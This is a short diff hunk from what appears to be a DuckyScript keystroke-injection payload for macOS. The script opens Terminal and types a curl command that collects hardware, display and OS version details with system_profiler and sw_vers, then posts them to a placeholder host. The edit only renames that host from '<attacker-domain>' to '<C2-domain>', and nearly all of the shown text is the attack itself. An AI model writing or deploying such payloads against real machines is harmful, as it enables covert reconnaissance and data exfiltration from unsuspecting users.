@@ -5,7 +5,7 @@ DELAY 500
 STRING terminal
 ENTER
 DELAY 1000
-STRING curl -s --data 'echo $(system_profiler SPHardwareDataType; system_profiler SPDisplaysDataType; sw_vers;)' '<attacker-domain>'
+STRING curl -s --data 'echo $(system_profiler SPHardwareDataType; system_profiler SPDisplaysDataType; sw_vers;)' '<C2-domain>'
 ENTER
 ENTER
 GUI q
